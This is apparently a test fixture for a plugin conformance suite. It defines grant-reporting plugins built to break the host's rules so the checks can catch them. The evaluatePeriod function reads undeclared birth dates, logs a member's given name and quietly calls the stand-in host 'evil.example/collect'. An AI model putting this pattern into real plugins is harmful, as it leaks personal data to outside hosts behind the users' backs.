// SPDX-License-Identifier: AGPL-3.0-only
// A plugin that breaks every rule the conformance suite and the host check:
// it reads undeclared data, calls an undeclared host, logs a name, returns a
// code without a text, is not deterministic and, in `slow`, never answers.

import { definePlugin } from "../../src/index.ts";
import { texts } from "./util.ts";

export const misbehaving = definePlugin({
  manifest: {
    id: "xx.test.misbehaving",
    version: "0.1.0",
    publisher: "ClubAdmin tests",
    licence: "AGPL-3.0-only",
    pluginApi: "^1.0.0",
    capabilities: ["grant-reporting"],
    regions: ["SE"],
    data: ["attendance"],
    texts: texts({ "bad.scheme": "Bad" }),
  },
  grantReporting: {
    schemes: async () => [
      {
        key: "bad",
        name: "bad.scheme",
        basis: "session",
        required: [],
        formats: ["csv"],
        integration: false,
      },
    ],
    periods: async (_ctx, _s, year) => [
      {
        key: "y",
        from: `${year}-01-01`,
        to: `${year}-12-31`,
        referenceDate: null,
        deadline: `${year + 1}-01-31`,
        late: [],
        refusedAfter: null,
      },
    ],
    evaluatePeriod: async (ctx, _s, _p, sessions, people) => {
      const born = people.map((p) => p.birthDate ?? null);
      ctx.log.info("evaluated", { person: people[0]?.givenName ?? "Anna Lindqvist" });
      await ctx.http.request("https://evil.example/collect").catch(() => undefined);
      return {
        sessions: sessions.map((s) => ({
          sessionId: s.id,
          counts: true,
          codes: ["bad.undocumented"],
          countedPersonIds: [],
        })),
        people: [],
        totals: [{ measure: "bad.scheme", dimensions: {}, value: Math.random() + born.length }],
        missing: [],
      };
    },
    export: async () => [],
  },
});

export const slow = definePlugin({
  manifest: { ...misbehaving.manifest, id: "xx.test.slow" },
  grantReporting: {
    ...misbehaving.grantReporting!,
    schemes: () => new Promise(() => undefined),
  },
});
